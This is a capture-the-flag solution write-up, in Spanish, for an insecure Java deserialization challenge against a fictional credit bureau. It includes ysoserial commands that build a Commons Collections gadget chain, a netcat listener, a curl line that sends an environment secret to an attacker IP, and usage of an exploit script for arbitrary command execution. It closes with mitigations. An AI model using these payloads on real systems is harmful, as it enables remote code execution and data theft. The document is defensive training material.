# Solucion - pwn-javadeser-02 - Equicore

**Categoria:** pwn - **Dificultad:** insane - **Vuln central:** deserializacion
insegura de Java (CWE-502) con gadget chain de Apache Commons Collections
(CVE-2015-7501), estilo `ysoserial CommonsCollections5/6`.

## Historia

Equicore es un buro de credito: agrega historiales de pago de medio pais y los
vende a bancos. Su portal interno de analistas "recuerda" la sesion serializando
un objeto `EquicoreSession` con `ObjectOutputStream`, lo entrega al cliente en
base64 (cookie `EQUICORE_SESSION`) y lo "restaura" con
`ObjectInputStream.readObject()` cuando el analista vuelve. Nadie valida que el
objeto que vuelve sea, de hecho, una sesion: el servidor deserializa lo que sea.

Esa decision -- confiar en datos serializados controlados por el cliente -- es
exactamente la familia de fallos que hundio a **Equifax en 2017**: ~147 millones
de personas expuestas y un acuerdo de hasta **~$1.4 mil millones**. (Equifax fue
Apache Struts 2, CVE-2017-5638, "el servidor procesa datos del cliente sin
validar"; aqui usamos la variante clasica de **objeto Java serializado** +
gadget chain de Commons Collections, popularizada por la charla "Marshalling
Pickles" de Frohoff/Lawrence y la herramienta `ysoserial`.)

Tu trabajo: comprometer el buro como lo hicieron los atacantes reales.

## Reconocimiento

1. `GET /` describe el portal y la "restauracion de sesion".
2. `GET /api/session/restore` devuelve una **sesion invitado serializada en
   base64** (`guest_session_b64`). Decodificala: empieza con la cabecera magica
   de Java serializado `AC ED 00 05` (`rO0AB...` en base64). Confirma que el
   servidor **serializa/deserializa objetos Java** del lado del cliente.
3. El servicio es Java y su classpath incluye **Apache Commons Collections 3.1**
   (mira `pom.xml` / el fat jar `equicore.jar` -> `org/apache/commons/collections/...`).
   Esa version es vulnerable: trae `InvokerTransformer`, `ChainedTransformer`,
   `LazyMap`, `TransformedMap` -- los ladrillos de las gadget chains de ysoserial.

## La vulnerabilidad

En `SessionRestoreServlet.restore()`:

```java
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(raw))) {
    obj = ois.readObject();   // <-- datos no confiables, SIN allow-list de clases
}
```

No hay `ObjectInputFilter` (JEP 290), ni `resolveClass()` sobreescrito, ni
allow-list. Cualquier objeto serializable del classpath se reconstruye. Con
Commons Collections 3.1 presente, una gadget chain ejecuta `Runtime.exec()`
**durante** `readObject()` -- antes de que el `cast` a `EquicoreSession` falle.
Por eso el endpoint puede responder error 500 y aun asi el comando ya corrio.

## Explotacion

### Opcion A - ysoserial (la herramienta de referencia)

`ysoserial` genera la gadget chain. Como el classpath del reto es Commons
Collections 3.1 (Java 8), usa `CommonsCollections5` o `CommonsCollections6`
(no dependen de la version del JDK como CC1):

```bash
# Descarga el jar (release oficial):
#   https://github.com/frohoff/ysoserial/releases  -> ysoserial-all.jar

# Exfiltra la flag (env FLAG) haciendo que el server la mande a tu listener.
# 1) En tu maquina (atacante), abre un listener:
nc -lvnp 4444

# 2) Genera el payload que ejecuta un curl/wget con $FLAG hacia tu listener.
#    OJO: ysoserial pasa UN solo argv a exec(); para usar pipes/$FLAG envuelve en sh -c.
ATTACKER=10.10.0.66        # tu IP en la VPN del equipo
java -jar ysoserial-all.jar CommonsCollections5 \
  "sh -c $@|sh . echo curl http://$ATTACKER:4444/?f=$FLAG" \
  | base64 -w0 > payload.b64

# 3) Enviala como la sesion guardada:
curl -s -X POST "http://<host>:8080/api/session/restore" \
     --data "state=$(cat payload.b64)"
# -> tu listener recibe  GET /?f=HL4{...}
```

> El truco `sh -c $@|sh . echo <cmd>` es el patron estandar de ysoserial para
> ejecutar una linea de shell completa (con `$FLAG`, pipes, etc.) pese a que
> `Runtime.exec(String)` no invoca un shell por si mismo.

### Opcion B - exploit incluido (sin ysoserial)

`solution/exploit.py` construye la gadget chain **CommonsCollections** a mano
(serializacion Java en Python puro) y la envia. No necesita Java ni ysoserial:

```bash
# Exfiltracion ciega via HTTP a un listener tuyo (recomendado):
python3 solution/exploit.py http://<host>:8080 --lhost 10.10.0.66 --lport 4444
#   (levanta antes:  nc -lvnp 4444  o  python3 -m http.server 4444)

# o ejecuta un comando arbitrario:
python3 solution/exploit.py http://<host>:8080 --cmd "id"
```

El script:
1. construye `ChainedTransformer([ConstantTransformer(Runtime), InvokerTransformer(getMethod...), InvokerTransformer(invoke...), InvokerTransformer(exec...)])`,
2. lo mete en un `LazyMap` decorado y lo dispara via
   `AnnotationInvocationHandler` (cadena CC1/CC5), serializa el grafo a bytes
   `AC ED 00 05 ...`,
3. lo codifica en base64 y lo manda como `state=` a `/api/session/restore`.

## Por que es INSANE

- No hay endpoint que "diga" RCE: hay que **reconocer** que el blob es un objeto
  Java serializado, **inspeccionar el classpath** para ver Commons Collections
  vulnerable y **elegir/construir la gadget chain correcta**.
- `Runtime.exec(String)` no usa shell: exfiltrar `$FLAG` exige el envoltorio
  `sh -c` (o `bash -c`) bien formado, un escalon donde mucha gente se atasca.
- La respuesta del server es un 500 generico aunque el comando ya corrio:
  feedback minimo, hay que confiar en la exfiltracion fuera de banda.

## Mitigaciones (didactico)

- **No deserializar datos no confiables.** Usar formatos de datos (JSON) con
  POJOs explicitos, nunca `ObjectInputStream` sobre input del cliente.
- Si es inevitable: `ObjectInputFilter` (JEP 290) con allow-list estricta de
  clases; firmar/encriptar el blob (HMAC) para que el cliente no pueda forjarlo.
- Sacar del classpath libs con gadgets conocidos; mantener dependencias al dia
  (Commons Collections >= 3.2.2 neutraliza los `InvokerTransformer` por defecto).

## Nota anti-cheat

La flag es **dinamica y unica por equipo** (HMAC del flag-service,
`ARCHITECTURE 4`), inyectada por env `FLAG` en runtime; el proceso hijo del
gadget la hereda y la exfiltra -- nunca esta horneada en la imagen. Compartir el
metodo no da puntos: cada equipo explota SU instancia en
`172.30.<N>.41:8080` para SU flag. Enviar la flag de otro equipo dispara
`cheat_flag_share`. Ademas, el filtro CTFREQ loguea CADA peticion (incluido el
blob base64 enviado a `/api/session/restore`) a STDOUT -> Promtail/Loki -> SIEM,
asi que los intentos de explotacion quedan registrados y narrados por el caster.
```
